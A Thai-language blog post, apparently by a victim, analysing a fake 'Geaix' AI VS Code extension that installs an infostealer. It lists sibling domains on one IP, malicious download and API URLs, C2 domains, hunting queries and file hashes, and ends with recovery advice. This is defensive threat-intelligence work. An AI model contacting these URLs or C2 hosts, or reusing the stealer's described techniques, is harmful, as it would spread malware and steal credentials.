แบ่งงานกันแบบนี้คือรูปแบบปกติของกลุ่มขโมยข้อมูลเลยค่ะ มีคนทำตัวขโมย มีคนกระจาย และมีคนซื้อหรือเอาข้อมูลที่ขโมยมาไปใช้ หรือคนทำ Geaix อาจจะแค่ไปเช่าตัวขโมยข้อมูลมาจากกลุ่มอื่นก็ได้

**ไม่ได้มีแค่ Geaix นะ** หลังเขียนโพสต์นี้รอบแรกเสร็จ เราไปขุดต่ออีกนิด พอเอา IP ของ `geaix.com` คือ `64.204.180.86` (เซิร์ฟเวอร์อยู่ที่ Frankfurt เยอรมนี) ไปค้นใน Censys ก็เจออีก 8 โดเมนชี้มาที่เครื่องเดียวกัน: `ahiak.com`, `aiqana.com`, `axqua.com`, `excelnt.ai`, `lebang.si`, `plikai.com`, `vunex.dev` และ `opnzy.com` เราเลยเช็คเองอีกรอบเมื่อวันที่ 22 ตุลาคม:

- ทุกโดเมนยังชี้ไปที่ `64.204.180.86` อยู่
- 7 โดเมนเป็น**เว็บเดียวกันเป๊ะ** แค่เปลี่ยนชื่อ ("Create your account · Ahiak", "· Aiqana", "· Vunex" ฯลฯ) Build เดียวกันจนไฟล์ Stylesheet ยังตรงกันทุกไฟล์
- 7 โดเมนนั้นมีหน้า `/dashboard/editor` และ Endpoint `/api/vscode/software/pick` ตัวเดียวกับที่ Extension ของ Geaix ใช้ดึงตัวขโมยข้อมูลมา ซึ่งตอบกลับเป็น `403` (ต้องมี Token ที่ล็อกอินแล้ว) ไม่ใช่ `404` แปลว่า Route นี้มีอยู่จริง
- `opnzy.com` ชี้มาที่เซิร์ฟเวอร์เดียวกัน แต่ตอนนี้ขึ้นแค่ "Not found"

![ผลค้นหา 64.204.180.86 ใน Censys เจอ geaix.com กับเว็บ AI อื่นๆ อยู่บนเซิร์ฟเวอร์เดียวกัน](/mrbeast/censys-shared-host.avif)
> เซิร์ฟเวอร์เดียวที่ Frankfurt แต่มีเครื่องมือ AI "คนละตัว" ตั้ง 9 เว็บ

เราไม่ได้สมัครหรือโหลด Extension จากเว็บพวกนั้นมานะคะ เลยยืนยันไม่ได้ว่าทุกเว็บปล่อยตัวขโมยตัวเดียวกัน แต่เซิร์ฟเวอร์เดียวกัน เว็บเดียวกัน API มัลแวร์ตัวเดียวกัน ต่างกันแค่ชื่อ จะบอกว่าบังเอิญก็ยากแล้วค่ะ ดูเหมือนเป็นกลุ่มเดียวที่ปั๊ม "เครื่องมือ AI ตัวใหม่" ออกมาเป็นล็อต พอชื่อนึงโดนแจ้ง ชื่อต่อไปก็รออยู่แล้ว นี่ก็เป็นอีกเหตุผลที่เราคิดว่าเป็นทีมค่ะ

**ทำไมถึงคิดว่าเป็นรัสเซีย:**
- ตัวขโมยข้อมูล**จะหยุดทำงานทันทีถ้าภาษาหรือคีย์บอร์ดของเครื่องเป็นรัสเซีย** หรือประเทศกลุ่ม CIS (`ru`, `uk`, `be`, `kk`, `uz`, `az`, `hy`, `tg`, `tk`, `ky`, `ro-md`) กลุ่มมัลแวร์ที่พูดรัสเซียชอบทำแบบนี้กัน จะได้ไม่มีปัญหากับกฎหมายบ้านตัวเอง
- มี**คำด่าภาษารัสเซีย**ซ่อนอยู่ในโค้ดส่วนที่ส่งข้อมูลออก

ทั้งหมดนี้เป็นเบาะแสที่ค่อนข้างชัด แต่ยังไม่ใช่หลักฐานนะคะ String กับการเช็คภาษาสามารถจงใจใส่ไว้เพื่อโยนความผิดให้คนอื่นได้

---

## Indicators of Compromise (IOCs) & วิธีตรวจสอบเครื่องตัวเอง

ใครเคยลง `geaix` หรือ `.vsix` ที่โหลดมาเอง ลองเช็คเครื่องตามนี้ได้เลยค่ะ:

### พิกัดไฟล์และโฟลเดอร์ในเครื่อง (Host Indicators)
- `%USERPROFILE%\.vscode\extensions\geaix.geaix-1.0.24`
- `%USERPROFILE%\.antigravity\extensions\geaix.geaix-1.0.24`
- โฟลเดอร์ใน `%TEMP%` (`%TEMP%\<prefix><sep><4-7 hex bytes>\`) ที่มีไฟล์ `javaw.exe`, `jli.dll` และ `vcruntime140.dll` อยู่ข้างใน โดยที่ `<prefix>` อยู่ในกลุ่มคำเหล่านี้:
  `SessionId`, `allowDots`, `installer`, `svchost`, `wuauclt`, `msupdate`, `text/plain;charset=US-ASCII`, `--\r\n`, `\n  `, `tmp`, `wawarabic`, `serverInfo`

### พฤติกรรมที่ใช้ตรวจจับ (Hunting Queries)
- มี Process `javaw.exe` รันขึ้นมาจากโฟลเดอร์ `%TEMP%` โดยมี Parent Process คือ `cmd.exe` (`/c start "" /B`) ที่ถูกเรียกมาจาก VS Code (`Code.exe`) หรือ Antigravity
- ไฟล์ `jli.dll` ที่วางคู่กับ `javaw.exe` มีค่า `IMAGE_EXPORT_DIRECTORY.Name` ภายในเป็น `loader.dll` แทนที่จะเป็น `jli.dll` หรือมีค่า `TimeDateStamp` เท่ากับ `0x6acb8e1f` (`2026-10-11 13:24:47 UTC`) และไม่มี Rich Header
- มีการเรียกใช้งาน PowerShell ทุกๆ 3 วินาทีด้วยคำสั่ง:
  `powershell.exe -NoProfile -Command "Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,CommandLine | ConvertTo-Json -Compress"`

### Network IOCs
| Indicator | ประเภท | รายละเอียด |
|---|---|---|
| `https://geaix.com/vsix/geaix-1.0.24.vsix` | URL | ลิงก์ดาวน์โหลดไฟล์ VSIX ต้นทาง |
| `https://geaix.com/dashboard/editor` | URL | หน้า Referrer ต้นทางที่ให้โหลด VSIX |
| `https://geaix.com/api/vscode/software/pick?platform=win` | URL | API ขอข้อมูลไฟล์ ZIP ของ Stage 1 (`x-geaix-feat: zip`) |
| `https://geaix.com/api/vscode/software/download/<id>` | URL | API ดาวน์โหลดไฟล์ ZIP ของ Stage 2 |
| `https://geaix.com/api/vscode/software/started` | URL | API แจ้งสถานะหลังสั่งรัน `javaw.exe` สำเร็จ |
| `wss://geaix.com/api/ws?client=vscode&token=<...>` | WebSocket | ช่องทางส่งข้อมูล Process Tree และการเปลี่ยนแปลงไฟล์ตลอด 15 นาทีแรก |
| `64.204.180.86` | IP | เซิร์ฟเวอร์ของ `geaix.com` และเว็บพี่น้อง (AS213250, Frankfurt, DE) |
| `ahiak.com`, `aiqana.com`, `axqua.com`, `excelnt.ai`, `lebang.si`, `plikai.com`, `vunex.dev` (+ `www.`) | Domain | เว็บ Geaix ตัวเดียวกันในชื่ออื่น มี Endpoint `/api/vscode/software/pick` เหมือนกัน (เช็คเมื่อ 22 ต.ค. 2026) |
| `opnzy.com` (+ `www.`) | Domain | ชี้ไปที่ IP เดียวกัน ตอนเช็ค 22 ต.ค. 2026 ขึ้น "Not found" |
| `dtapi.cc:443` | C2 Domain | เซิร์ฟเวอร์ C2 หลักของ Stage 3 (`0x18007e4ed`, คีย์ XOR `0x8d`) |
| `x1zsp.cc:443` | C2 Domain | เซิร์ฟเวอร์ C2 สำรองลำดับที่ 2 (`0x18007d214`, คีย์ XOR `0xe5`) |
| `cfmlapi.cc:443` | C2 Domain | เซิร์ฟเวอร์ C2 สำรองลำดับที่ 3 (`0x180079451`, คีย์ XOR `0xd9`) |
| `01a12b22-5ca2-7f90-849a-8304fc081a08` | UUID | รหัสประจำแคมเปญ / Botnet UUID (`0x18007c6ff`, คีย์ XOR `0x43`) |

### ค่า Hash ของไฟล์ทั้งหมด (SHA-256)
| ชื่อไฟล์ | ขนาด (Bytes) | SHA-256 |
|---|---|---|
| `geaix-1.0.24.vsix` | `27,124,774` | `02cd28dc0a9c1ee109462aa6942dfbc3bdb1af9210315eaa326e73e49d01ac0d` |
| `extension/dist/extension.js` (ใน VSIX) | `36,654,196` | `c9189e2c1ff2d216618059513735b034598cbb728d5cc6542f3f1ef79d3c7975` |
| `javaw.exe` (Signed Adoptium Temurin) | `50,344` | `ca798475399c19c13be92b91f262003e82befe5ecc35a0e25e72522868466357` |
| `jli.dll` (Stage 2 `loader.dll`) | `736,256` | `d76e906a18c04826996d1f30de248e7a0e50c48814c82e9583b36c91fdf66f00` |
| `vcruntime140.dll` (Signed MS CRT) | `123,472` | `184146852727a9db4eea06178716bec3cdbb1015c911f6b0f915b184ad7775b2` |
| `unpacked_build_full.dll` (`build.dll` ประกอบ PE ใหม่) | `607,744` | `dd81a7c12465d70e85e59ee49c1ed9fe4c9b4d2d65ea4b7e1857b84985444653` |

---

## ควรทำยังไง

**ถ้าบัญชีเพิ่งส่งสแปมแบบนี้ออกไป:**
1. **ล้างเครื่องก่อน** ถ้าเปลี่ยนรหัสผ่านทั้งที่ตัวขโมยยังอยู่ในเครื่อง มันก็ขโมยรหัสใหม่ไปอีกรอบ ให้เปลี่ยนรหัสจากมือถือหรือเครื่องอื่นที่ไว้ใจได้
2. **เตะ Session ออกให้หมด ไม่ใช่แค่เปลี่ยนรหัส** คุกกี้ที่โดนขโมยจะยังใช้ได้จนกว่าเว็บจะ Log out มันออก ใน Discord การเปลี่ยนรหัสผ่านจะรีเซ็ต Token และเตะอุปกรณ์อื่นออก แต่ให้เข้าไปดู **Settings -> Devices** แล้วลบอันที่ไม่รู้จักด้วย ส่วน Instagram, Google, GitHub, Steam และอื่นๆ ให้กด "Log out of all devices" หรือเมนูที่คล้ายกัน แล้วค่อยเปลี่ยนรหัส
3. **Discord: เช็ค Ignored list** เข้าไปที่ **Settings -> Content & Social -> Ignored accounts** แล้วกด Unignore เพื่อนที่โดนบอทกดไว้ จะได้เห็นข้อความเพื่อนที่ทักมาถามว่าโดนแฮกหรือเปล่า
4. **ถ้ามีคริปโต:** เช็คประวัติล็อกอิน ประวัติการถอน รายชื่อที่อยู่ถอนที่อนุญาตไว้ (Whitelist) และ API key ของ Exchange ทุกที่ ถ้าเคยมี Extension กระเป๋าคริปโตในเครื่องนั้น ให้ย้ายเงินไปกระเป๋าใหม่ที่สร้าง Seed phrase ใหม่บนเครื่องที่สะอาด แค่เปลี่ยนรหัส Extension ไม่พอ เพราะคนร้ายมีไฟล์ Vault ไปแล้ว
5. **บอกเพื่อนๆ** ว่าเป็นสแกม อย่าเข้าเว็บหรือกรอกโค้ดนั้น

**กันไม่ให้โดนตั้งแต่แรก:**
1. **มอง Extension, Plugin, Mod ให้เหมือนโปรแกรมตัวนึง** VS Code Extension ทำทุกอย่างที่เราทำได้บนเครื่อง ไม่มี Sandbox กั้นเลย ถ้าเว็บไหนให้โหลดไฟล์ `.vsix` มาติดตั้งเองแทนที่จะลงจาก Marketplace ทางการ ให้ระวังไว้ก่อนเลยค่ะ
2. **อย่าพึ่งระบบเซฟรหัสผ่านในเบราว์เซอร์อย่างเดียว** ระบบ `v20` ใหม่ของ Chrome ทำให้ขโมยยากขึ้นก็จริง แต่ตัวนี้ก็ยังข้ามไปได้ ใช้ Password Manager แยกที่ล็อกตัวเองได้ (Bitwarden, KeePassXC) จะปลอดภัยกว่า ถ้าใช้ Firefox หรือ Zen อย่างน้อยให้ตั้ง Primary Password ไว้
3. **2FA กัน Session ที่โดนขโมยไม่ได้** 2FA กันแค่ตอนล็อกอิน แต่คุกกี้ที่โดนขโมยข้ามขั้นตอนนั้นไปเลย การเตะ Session ออกเลยสำคัญพอๆ กับการเปลี่ยนรหัสผ่าน

ขอโทษเพื่อนๆ ทุกคนอีกครั้งที่ได้รับสแปมจาก Discord หรือ IG ของเราในวันที่ 19 นะคะ ตอนนี้เปลี่ยนรหัสและเตะ Session ออกหมดแล้ว Windows ตัวนั้นก็ล้างทิ้งไปแล้วค่ะ ใครลง Extension แปลกๆ ไว้ลองไปเช็คกันดูนะคะ เจอกันใหม่ใน blog หน้าค่ะ
